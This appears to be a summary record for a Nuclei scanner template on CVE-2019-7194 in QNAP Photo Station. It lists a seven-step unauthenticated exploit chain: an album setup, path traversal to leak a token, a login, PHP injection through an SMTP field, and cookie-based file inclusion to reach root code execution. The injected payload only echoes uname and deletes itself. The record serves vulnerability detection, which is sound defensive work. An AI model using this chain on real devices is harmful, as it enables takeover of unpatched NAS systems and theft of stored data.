---
cve_id: CVE-2019-7194
template_path: nuclei-templates/http/cves/2019/CVE-2019-7194.yaml
affected_product: QNAP Photo Station
severity: critical
authentication: none
external_callback: false
affected_versions: prior to 6.0.3
preconditions: []
poc_classification: rce
---

## Vulnerability
QNAP Photo Station versions prior to 6.0.3 contain multiple vulnerabilities (path traversal/LFI combined with improper input sanitization) that can be chained by unauthenticated remote attackers to achieve remote code execution with root privileges. This grants complete control over the QNAP device and access to all stored data.

**CVSS Score:** 9.8  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**CWE:** CWE-22  
**EPSS:** 0.93938 (99.876th percentile)

## PoC / Detection
Classification: rce

The template executes a 7-step chained exploit flow (http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)) that fully weaponizes the vulnerability for verification:

1. POST `/photo/p/api/album.php` (a=setSlideshow&f=qsamplealbum) to create a fake album and extract `album_id`.
2. GET `/photo/slideshow.php?album={{album_id}}` to obtain `access_code` and `PHPSESSID`.
3. POST `/photo/p/api/video.php` with directory traversal (`filename=../../../../../share/Multimedia/.@__thumb/ps.app.token`) to leak `app_token`.
4. POST `/cgi-bin/authLogin.cgi` (app=PHOTO_STATION&auth=1&app_token={{app_token}}) to obtain `NAS_SID`.
5. POST `/cgi-bin/userConfig.cgi?sid={{nas_sid}}` (func=addPersonalSmtp) to inject a self-deleting PHP payload (`<?php echo php_uname(); unlink(__FILE__); ?>`) via the SMTP sender field.
6. GET `/photo/slideshow.php?album=qsamplealbum` with malicious `QMS_SID=../../../../.../{{dropper_filename}}.php` cookie to trigger file inclusion.
7. GET `/photo/{{dropper_filename}}.php` to execute the dropper; matches on `status_code == 200 && contains(body, 'NASVARS')` and extracts output.

Uses random filenames and automatic cleanup for non-destructive detection; marked intrusive.

## References
- https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05
